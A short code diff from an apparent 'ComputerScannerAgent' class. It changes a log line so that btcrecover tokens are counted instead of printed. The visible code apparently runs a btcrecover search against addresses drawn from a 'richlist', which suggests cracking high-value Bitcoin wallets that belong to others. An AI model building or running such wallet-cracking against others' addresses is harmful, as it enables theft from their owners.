@@ -197,7 +197,7 @@ class ComputerScannerAgent:
 
         # 1. Targeted Recovery Search
         if self.deep_scan or self.btc_recover_tokens:
-            print(f"[ComputerScanner] Initiating Deep Search with tokens: {self.btc_recover_tokens}")
+            print(f"[ComputerScanner] Initiating Deep Search with {len(self.btc_recover_tokens)} tokens and {len(self._richlist)} targets")
             res = run_btcrecover_scan(
                 tokenlist=self.btc_recover_tokens,
                 target_addresses=list(self._richlist),
